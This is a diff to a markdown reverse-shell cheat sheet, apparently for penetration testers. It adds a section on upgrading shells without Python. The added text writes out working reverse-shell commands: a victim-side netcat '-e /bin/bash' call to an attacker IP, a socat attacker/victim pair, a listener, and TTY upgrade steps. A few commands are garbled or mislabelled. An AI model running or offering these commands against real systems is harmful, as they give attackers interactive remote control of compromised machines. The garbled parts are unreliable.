@@ -22,6 +22,10 @@ title: Benji's reverse shell cheat sheet
 - [Windows Reverse (Power) Shell Generator](#windows-reverse-power-shell-generator)
 - [Windows Listener](#windows-listener)
 - [Upgrading your Reverse Shell](#upgrading-your-reverse-shell)
+  - [Using Python](#using-python)
+  - [Upgrade to better TTY without Python](#upgrade-to-better-tty-without-python)
+    - [Copy over NC and spawn a shell](#copy-over-nc-and-spawn-a-shell)
+    - [Break out of pseudo shell and upgrade to a tty shell](#break-out-of-pseudo-shell-and-upgrade-to-a-tty-shell)
 - [Send file from machine to listener](#send-file-from-machine-to-listener)
 
 
@@ -236,6 +240,7 @@ $stream.Dispose()
 
 ## Upgrading your Reverse Shell
 
+### Using Python
 `python -c'import pty; pty.spawn("/bin/bash")'`
 
 Background Session with `ctrl + z`
@@ -253,6 +258,49 @@ Set rows and cols and Foreground Session again
 fg #jobnumber
 export XTERM=xterm-color
 ```
+
+### Upgrade to better TTY without Python
+
+During various assessments I also came to a point where no python, php, socat or ruby were available.
+
+First of all if you do not wish to go through the hassle of having tty with bash completion etc. then merely fire the following command into the pseudo terminal to break out of the pseudo terminal:
+
+```shell
+/usr/bin/script -qc /bin/bash /dev/null
+#followed by:
+stty raw -echo; fg; reset
+```
+
+Hint: Not 100% working all the time through a couple of hoops to obtain the TTY shell
+
+#### Copy over NC and spawn a shell
+
+```shell
+Server: ./nc 10.x.x.x 9998 -e /bin/bash
+---------------------------------------------------------------------
+Attacking Machine: cp /usr/bin/nc .; python -m SimpleHttpServer 9998
+Attacking Machine: nc -nlvp 9998
+```
+
+#### Break out of pseudo shell and upgrade to a tty shell
+First attempt: upgrade to pty shell (if python is available)
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+# OR Using SOCAT
+Attacking Server: socat file:`tty`,raw,echo=0 tcp-listen:9998
+Victim Machine: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.x.x.x:9998 
+```
+
+Fallback: Using script if python or socat are unavailable
+
+```
+Attacking Machine: /usr/bin/script -qc /bin/bash /dev/null
+```
+
+All that is left is to do the following to get an interactive shell:
+A: CTRL + Z to background the shell
+B: paste or type the following into the terminal on the attacking machine `stty raw -echo; fg; reset`
 
 
 
